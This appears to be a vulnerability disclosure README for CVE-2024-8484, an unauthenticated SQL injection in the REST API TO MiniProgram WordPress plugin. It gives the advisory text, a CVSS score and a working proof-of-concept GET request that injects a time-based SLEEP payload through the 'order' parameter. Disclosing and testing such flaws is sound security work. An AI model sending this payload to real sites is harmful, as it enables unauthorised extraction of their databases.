# CVE-2024-8484
REST API TO MiniProgram &lt;= 4.7.1 - Unauthenticated SQL Injection

```
CVE: CVE-2024-8484
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CVSS Score: 7.5
Slugs: rest-api-to-miniprogram
```
Description:
---

The REST API TO MiniProgram plugin for WordPress is vulnerable to SQL Injection via the 'order' parameter of the /wp-json/watch-life-net/v1/comment/getcomments REST API endpoint in all versions up to, and including, 4.7.1 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

POC
---

```
GET /wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT(1)FROM(SELECT(SLEEP(10)))a)--&postid=3&limit=1&page=1&page=1 HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/post-new.php?post_type=page
Connection: keep-alive
If-Modified-Since: Mon, 16 Sep 2024 18:56:28 GMT
If-None-Match: "5a3-62241215fdfaa-gzip"
Priority: u=2
```

![alt text](https://github.com/RandomRobbieBF/CVE-2024-8484/blob/main/CVE-2024-8484.png?raw=true)
